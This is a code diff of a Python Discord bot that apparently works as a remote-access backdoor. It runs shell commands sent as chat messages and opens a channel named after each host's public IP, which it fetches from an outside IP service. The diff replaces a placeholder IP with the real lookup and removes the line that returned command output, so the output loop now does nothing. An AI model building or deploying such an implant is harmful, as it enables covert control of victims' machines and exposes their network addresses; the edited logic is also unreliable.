@@ -5,7 +5,6 @@ import os
 
 DISCORD_TOKEN = os.getenv("DISCORD_TOKEN")
 
-
 intents = discord.Intents.default()
 intents.message_content = True
 client = discord.Client(intents=intents)
@@ -49,8 +48,7 @@ def execute_cmd(cmd):
 async def on_ready():
     global channel
     guild = client.guilds[0]
-    ip = requests.get("https://api.ipify.org").text.replace(",","-")
-    ip = "1-3-3-7"
+    ip = requests.get("https://api.ipify.org").text.replace(".", "-")
     channel = await guild.create_text_channel(ip)
 
 
@@ -70,9 +68,6 @@ async def on_message(message):
         if len(result) < 2000:
             break
         result = result[2000:]
-
-
-    await message.channel.send(result)
 
 
 client.run(DISCORD_TOKEN)
